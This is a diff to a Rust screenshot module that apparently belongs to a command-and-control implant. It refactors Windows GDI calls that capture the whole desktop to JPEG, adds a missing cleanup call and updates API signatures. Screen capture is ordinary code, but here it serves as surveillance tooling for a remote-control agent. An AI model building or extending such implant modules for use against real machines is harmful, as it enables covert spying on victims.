@@ -6,6 +6,7 @@
 //! - macOS: CGWindowListCreateImage
 
 use anyhow::Result;
+use std::io::Write;
 use tracing::info;
 
 use crate::c2::Command;
@@ -23,50 +24,53 @@ impl ScreenshotModule {
     /// Capture screenshot (platform-specific)
     #[cfg(windows)]
     fn capture_screenshot(&self) -> Result<Vec<u8>, ModuleError> {
-        use windows::Win32::Foundation;
-        use windows::Win32::Graphics::Gdi;
+        use windows::Win32::Foundation::HWND;
+        use windows::Win32::Graphics::Gdi::{
+            self, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject,
+            GetDC, GetDIBits, GetSystemMetrics, ReleaseDC, RGBQUAD, SelectObject, SRCCOPY,
+            BITMAPINFO, BITMAPINFOHEADER, DIB_RGB_COLORS,
+        };
 
         const SM_CXSCREEN: i32 = 0;
         const SM_CYSCREEN: i32 = 1;
-        const BI_RGB: u32 = 0;
-        const DIB_RGB_COLORS: u32 = 0;
 
         // Create desktop device context
-        let hdc = unsafe { Gdi::GetDC(Foundation::HWND::default()) };
+        let hdc = unsafe { GetDC(HWND::default()) };
 
-        let screen_width = unsafe { Gdi::GetSystemMetrics(SM_CXSCREEN) };
-        let screen_height = unsafe { Gdi::GetSystemMetrics(SM_CYSCREEN) };
+        let screen_width = unsafe { GetSystemMetrics(SM_CXSCREEN) };
+        let screen_height = unsafe { GetSystemMetrics(SM_CYSCREEN) };
 
         if screen_width <= 0 || screen_height <= 0 {
+            unsafe { ReleaseDC(HWND::default(), hdc) };
             return Err(ModuleError::Execution("Invalid screen dimensions".to_string()));
         }
 
         // Create compatible DC and bitmap
-        let mem_dc = unsafe { Gdi::CreateCompatibleDC(hdc) };
+        let mem_dc = unsafe { CreateCompatibleDC(hdc) };
         if mem_dc.0.is_null() {
-            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+            unsafe { ReleaseDC(HWND::default(), hdc) };
             return Err(ModuleError::Execution("Failed to create compatible DC".to_string()));
         }
 
         let bitmap = unsafe {
-            Gdi::CreateCompatibleBitmap(
+            CreateCompatibleBitmap(
                 hdc,
                 screen_width,
                 screen_height,
             )
         };
         if bitmap.0.is_null() {
-            unsafe { Gdi::DeleteDC(mem_dc) };
-            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+            unsafe { DeleteDC(mem_dc) };
+            unsafe { ReleaseDC(HWND::default(), hdc) };
             return Err(ModuleError::Execution("Failed to create bitmap".to_string()));
         }
 
         // Select bitmap into DC
-        let old_bitmap = unsafe { Gdi::SelectObject(mem_dc, bitmap) };
+        let old_bitmap = unsafe { SelectObject(mem_dc, bitmap) };
 
         // BitBlt screen to bitmap
         let success = unsafe {
-            Gdi::BitBlt(
+            BitBlt(
                 mem_dc,
                 0,
                 0,
@@ -75,14 +79,14 @@ impl ScreenshotModule {
                 hdc,
                 0,
                 0,
-                Gdi::SRCCOPY,
+                SRCCOPY,
             )
         };
 
-        if !success.as_bool() {
-            unsafe { Gdi::DeleteObject(bitmap) };
-            unsafe { Gdi::DeleteDC(mem_dc) };
-            unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+        if !success.ok() {
+            unsafe { DeleteObject(bitmap) };
+            unsafe { DeleteDC(mem_dc) };
+            unsafe { ReleaseDC(HWND::default(), hdc) };
             return Err(ModuleError::Execution("BitBlt failed".to_string()));
         }
 
@@ -90,10 +94,10 @@ impl ScreenshotModule {
         let jpeg_data = Self::bitmap_to_jpeg(mem_dc, bitmap, screen_width, screen_height)?;
 
         // Cleanup
-        unsafe { Gdi::SelectObject(mem_dc, old_bitmap) };
-        unsafe { Gdi::DeleteObject(bitmap) };
-        unsafe { Gdi::DeleteDC(mem_dc) };
-        unsafe { Gdi::ReleaseDC(Foundation::HWND::default(), hdc) };
+        unsafe { SelectObject(mem_dc, old_bitmap) };
+        unsafe { DeleteObject(bitmap) };
+        unsafe { DeleteDC(mem_dc) };
+        unsafe { ReleaseDC(HWND::default(), hdc) };
 
         Ok(jpeg_data)
     }
@@ -178,14 +182,16 @@ impl ScreenshotModule {
         width: i32,
         height: i32,
     ) -> Result<Vec<u8>, ModuleError> {
-        use windows::Win32::Graphics::Gdi;
+        use windows::Win32::Graphics::Gdi::{
+            self, BITMAPINFO, BITMAPINFOHEADER, RGBQUAD, GetDIBits, DIB_RGB_COLORS,
+        };
 
         const BI_RGB: u32 = 0;
 
         // Get bitmap bits
-        let mut bmi = Gdi::BITMAPINFO {
-            bmiHeader: Gdi::BITMAPINFOHEADER {
-                biSize: std::mem::size_of::<Gdi::BITMAPINFOHEADER>() as u32,
+        let mut bmi = BITMAPINFO {
+            bmiHeader: BITMAPINFOHEADER {
+                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                 biWidth: width,
                 biHeight: height,
                 biPlanes: 1,
@@ -197,7 +203,7 @@ impl ScreenshotModule {
                 biClrUsed: 0,
                 biClrImportant: 0,
             },
-            bmiColors: [Gdi::RGBQUAD {
+            bmiColors: [RGBQUAD {
                 rgbRed: 0,
                 rgbGreen: 0,
                 rgbBlue: 0,
@@ -209,13 +215,13 @@ impl ScreenshotModule {
         let bits_ptr = bits.as_mut_ptr() as *mut std::ffi::c_void;
 
         let success = unsafe {
-            Gdi::GetDIBits(
+            GetDIBits(
                 hdc,
                 bitmap,
                 0,
                 height as u32,
-                bits_ptr,
-                &mut bmi as *mut Gdi::BITMAPINFO,
+                Some(bits_ptr),
+                &mut bmi as *mut BITMAPINFO,
                 DIB_RGB_COLORS,
             )
         };
